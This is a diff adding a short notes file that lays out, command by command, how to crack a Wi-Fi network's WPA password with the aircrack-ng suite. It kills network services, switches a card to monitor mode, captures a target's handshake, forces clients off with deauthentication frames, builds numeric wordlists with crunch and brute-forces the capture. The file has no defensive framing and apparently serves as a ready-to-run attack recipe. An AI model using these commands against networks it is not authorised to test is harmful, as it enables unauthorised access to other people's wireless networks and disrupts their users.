@@ -1,0 +1,41 @@
+sudo su
+cd ~/
+
+only git version - git clone https://aur.archlinux.org/aircrack-ng-git.git
+cd aircrack-ng-git
+makepkg -si
+
+
+mkdir ~/hs
+cd ~/hs
+
+
+
+
+# kill services (iw, wpa_supplicant)
+airmon-ng check kill
+
+# start monitor mode
+airmon-ng start <interface>
+
+# dump
+airodump-ng <interface>mon
+
+# target dump
+airodump-ng -c <channel> --bssid <ap> -w <dump name> <interface>mon
+
+# active attack
+aireplay-ng -0 3 -a <ap> -c <user> <interface>
+
+
+#create pass list (if not exist)
+
+# create simple password list with only numbers
+crunch 8 8 0123456789 -o ~/hs/pass.txt
+
+# or create revert list
+crunch 8 8 0987654321 -o ~/hs/pass_rev.txt
+
+
+# crack
+aircrack-ng -b <ap> <dump>.cap -w ~/pass.txt
